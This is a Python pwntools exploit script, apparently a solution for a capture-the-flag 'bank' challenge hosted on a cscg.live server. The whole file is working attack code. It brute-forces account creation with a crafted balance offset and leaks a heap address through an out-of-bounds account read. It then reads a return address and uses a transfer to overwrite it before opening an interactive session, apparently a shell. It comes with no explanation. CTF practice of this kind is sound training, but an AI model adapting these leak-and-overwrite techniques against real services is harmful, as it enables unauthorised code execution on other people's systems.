import pwn
host = "localhost"
port = 1025
host = "844b0780d7a2a1f6d31236ee-1024-bank.challenge.cscg.live"
port = 1337

i = -1
l = pwn.log.progress("brute force")
while True:
    i+=1
    pwn.context.log_level = 'info'
    l.status(f"{hex(i)}")
    pwn.context.log_level = 'error'
    try:

        p = pwn.remote(host, port, ssl = True )
        #p = pwn.remote(host, port)

        def add_acc(val):
            p.sendlineafter(b"choice: ",b"1")
            p.sendlineafter(b"Name: ",b"")
            p.sendlineafter(b"Balance: ", val)
            p.recvline()
            return p.recvline().split(b"Number: ")[1][:-1]
            

        def read(acc_num):
            p.sendlineafter(b"choice: ",b"2")
            p.sendlineafter(b"Number: ",acc_num)
            acc = p.recvline()
            name = p.recvline()
            print(acc)
            print(name)
            bal = p.recvline().split(b"Balance: ")[1][:-1]
            return bal
        
        def transfer(sender, receiver, amount):
            p.sendlineafter(b"choice: ", b"3")
            p.sendlineafter(b"Number: ", sender)
            p.sendlineafter(b"Number: ", receiver)
            p.sendlineafter(b"Amount: ", amount)
        
        offset = 0x150 - 0x37
        for k in range(i):
            tmp = add_acc(f"{offset}".encode())
        j = 0
        heap_leak = int(read(f'{j}'.encode()).decode())
        if heap_leak & 0xff != 0x23:
            print(hex(heap_leak))
            p.close()
            continue
        tar = heap_leak - 9651
        ret_address = int(read(f"{tar}".encode()))
        print(tmp)
        transfer(tmp, f"{tar}".encode(), f"{offset}".encode())
        print(hex(ret_address))
        p.interactive()
    except EOFError:
        p.close()
        continue
